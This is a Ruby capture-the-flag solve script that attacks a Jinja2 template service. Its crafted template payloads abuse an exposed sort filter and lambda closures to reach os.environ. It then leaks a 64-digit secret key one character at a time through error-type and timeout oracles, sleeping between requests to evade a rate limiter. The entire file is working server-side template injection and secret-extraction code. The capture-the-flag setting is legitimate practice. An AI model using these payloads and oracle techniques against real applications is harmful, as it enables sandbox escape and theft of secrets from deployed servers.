require 'timeout'
require 'net/http'
require 'uri'

HTTP = Net::HTTP
$uri = URI('http://127.0.0.1/run')
$uri.port = 5000
TIMEOUT_SECONDS = 0.5
# to get past rate limiter (script takes ~3 minutes to run with the 0.2 second default)
WAIT_BETWEEN_REQUEST_SECONDS = 0.2

# From looking at the source code we know the KEY
# is 64 hexadecimal digits long
KEY_LENGTH = 64
NUMBERS = [*'0'..'9']
LETTERS = [*'a'..'f']
$key = KEY_LENGTH.times.map { NUMBERS + LETTERS }

def submit(key)
  uri = URI('http://challs2.pyjail.club/flag')
  uri.port = 7305
  response = HTTP.post_form(uri, {'key' => key})
  puts response.body
end

# Generates a Jinja2 template that abuses this Python function that is
# exposed to the template as a filter:
# def median(lst, high=True):
#     lst.sort(key=lambda x: x if high else -x)
#     return lst[len(lst)//2]
def make_template(format_spec, value_to_format='1')
  %`{{namespace(sort='{%s:%s}'.format) | median(namespace(value=%s))}}` % [
    'key.__closure__[0].cell_contents.value', # path to `high` in the lambda
    format_spec,
    value_to_format
  ]
end

def try_for_all(template, &block)
  KEY_LENGTH.times do |i|
    templ = template.sub('#', "{key.__globals__[os].environ[KEY][#{i}]}")
    begin
      # yes, i know timeout is cursed, it's fiiine
      # https://jvns.ca/blog/2015/11/27/why-rubys-timeout-is-dangerous-and-thread-dot-raise-is-terrifying/
      body = nil
      Timeout.timeout(TIMEOUT_SECONDS) {
        body = HTTP.post_form($uri, {'template' => templ}).body
      }
    rescue Timeout::Error
      block.call(i, "ConnectionTimeout")
    else
      block.call(i, body)
    end
    sleep WAIT_BETWEEN_REQUEST_SECONDS
  end
end

# OverflowError for 'c', ValueError for 'a', otherwise TypeError
AC_TEMPLATE = make_template('#', '0x110001')
try_for_all(AC_TEMPLATE) do |i, response|
  case response
  when /ValueError/    then $key[i] &= ['a']
  when /OverflowError/ then $key[i] &= ['c']
  when /TypeError/     then $key[i] &= NUMBERS + 'bdef'.chars
  else
    abort("BUGS IN AC_TEMPLATE #{response}")
  end
end

# ValueError for 'abcd', TypeError for '0123456789ef'
ABCD_TEMPLATE = make_template('#', '1.0')
try_for_all(ABCD_TEMPLATE) do |i, response|
  case response
  when /ValueError/ then $key[i] &= 'abcd'.chars
  when /TypeError/  then $key[i] &= NUMBERS + 'ef'.chars
  else
    abort("BUGS IN ABCD_TEMPLATE #{response}")
  end
end

# ValueError for 'abcdef', TypeError for '0123456789'
ABCDEF_TEMPLATE = make_template('.#', '1.0')
try_for_all(ABCDEF_TEMPLATE) do |i, response|
  case response
  when /ValueError/ then $key[i] &= LETTERS
  when /TypeError/  then $key[i] &= NUMBERS
  else
    abort("BUGS IN ABCDEF_TEMPLATE #{response}")
  end
end

# TypeError for 'def', ValueError for '0123456789abc'
DEF_TEMPLATE = make_template(',#')
try_for_all(DEF_TEMPLATE) do |i, response|
  case response
  when /TypeError/  then $key[i] &= 'def'.chars
  when /ValueError/ then $key[i] &= NUMBERS + 'abc'.chars
  else
    abort("BUGS IN DEF_TEMPLATE #{response}")
  end
end

# ValueError for >9223372036854775807, MemoryError for <= (letters also ValueError)
NUM_TEMPLATES = {
  9 => make_template('9223372036854775#07'),
  8 => make_template('92233720368547#5807'),
  7 => make_template('922337203#854775807'),
  6 => make_template('92233720368#4775807'),
  5 => make_template('922337203685#775807'),
  4 => make_template('922#372036854775807'),
  3 => make_template('9#23372036854775807'),
  2 => make_template('922337#036854775808'),
  1 => make_template('9223372#36854775807'),
}
9.downto(1) do |n|
  try_for_all(NUM_TEMPLATES[n]) do |i, response|
    case response
    when /ValueError/  then $key[i] &= NUMBERS[n..] + LETTERS
    when /MemoryError/ then $key[i] &= NUMBERS[...n]
    else
      abort("BUGS IN NUM_TEMPLATE[#{n}] #{response}")
    end
  end
end

# TypeError for 'e', *very* slow for 'f', ValueError for others
EF_TEMPLATE = make_template('.2147483647#')
try_for_all(EF_TEMPLATE) do |i, response|
  case response
  when /ConnectionTimeout/ then $key[i] &= ['f']
  when /TypeError/         then $key[i] &= ['e']
  when /ValueError/        then $key[i] &= NUMBERS + 'abcd'.chars
  else
    abort("BUGS IN EF_TEMPLATE #{response}")
  end
end

puts $key.map { _1.size == 1 ? _1 : sprintf(' ( %s ) ', _1.join('|')) }.join
